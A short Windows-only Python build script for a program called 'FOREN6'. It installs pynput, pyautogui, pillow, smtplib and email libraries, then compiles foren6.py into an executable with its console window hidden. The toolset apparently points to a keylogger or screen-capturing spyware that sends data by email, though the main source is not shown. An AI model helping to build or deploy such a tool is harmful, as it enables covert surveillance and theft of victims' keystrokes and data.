import os
import platform
system = platform.system()
if system == "Windows":
    print("Building FOREN6...")
    print("Downloading dependencies...")
    print("Downloading emails...")
    os.system("pip install emails")
    print("Complete.")
    print("Downloading pynput...")
    os.system("pip install pynput==1.6.8")
    print("Complete.")
    print("Downloading smtplib...")
    os.system("pip install secure-smtplib")
    print("Complete.")
    print("Downloading pyautogui...")
    os.system("pip install pyautogui")
    print("Complete.")
    print("Downloading requests...")
    os.system("pip install requests")
    print("Complete.")
    print("Downloading nuitka...")
    os.system("pip install -U nuitka")
    print("Completed.")
    print("Downloading pillow")
    os.system("pip install pillow")
    print("Completed.")
    print("Downloaded all dependencies.")
    print("Creating executable...")
    os.system(f"nuitka --mingw64 --windows-disable-console foren6.py")


    input("Finished!!!")
else:
    input("Only windows machines are permited!!!")

